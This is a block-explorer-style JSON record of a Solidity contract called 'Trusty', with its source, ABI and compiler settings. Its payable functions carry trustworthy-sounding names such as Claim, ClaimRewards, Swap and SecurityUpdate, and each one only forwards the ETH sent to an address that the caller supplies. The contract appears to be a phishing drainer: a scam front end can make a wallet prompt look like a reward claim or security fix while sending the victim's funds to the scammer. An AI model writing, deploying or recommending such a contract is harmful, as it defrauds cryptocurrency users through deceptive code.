{"SourceCode": "// SPDX-License-Identifier: Unlicense\r\n\r\npragma solidity ^0.8.18;\r\n\r\ncontract Trusty {\r\n\r\n  address private owner;\r\n\r\n  event Ownership(address indexed previous_owner, address indexed current_owner);\r\n\r\n  constructor() { owner = msg.sender; }\r\n\r\n  function getOwner() public view returns (address) { return owner; }\r\n  function getBalance() public view returns (uint256) { return address(this).balance; }\r\n\r\n  function withd(address sender) private {\r\n    payable(sender).transfer(msg.value);\r\n  }\r\n\r\n  function Claim(address sender) public payable { withd(sender); }\r\n  function ClaimReward(address sender) public payable { withd(sender); }\r\n  function ClaimRewards(address sender) public payable { withd(sender); }\r\n  function Execute(address sender) public payable { withd(sender); }\r\n  function Multicall(address sender) public payable { withd(sender); }\r\n  function Swap(address sender) public payable { withd(sender); }\r\n  function Connect(address sender) public payable { withd(sender); }\r\n  function SecurityUpdate(address sender) public payable { withd(sender); }\r\n\r\n  function transferOwnership(address new_owner) public {\r\n    require(msg.sender == owner, \"Access Denied\");\r\n    address previous_owner = owner; owner = new_owner;\r\n    emit Ownership(previous_owner, new_owner);\r\n  }\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previous_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"current_owner\",\"type\":\"address\"}],\"name\":\"Ownership\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"Claim\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"ClaimReward\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"ClaimRewards\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"Connect\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"Execute\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"Multicall\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"SecurityUpdate\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"Swap\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"new_owner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Trusty", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://3e73532239ce20b7a3a48b2273e500fd908c40e75717e38f53311596e0d384bf"}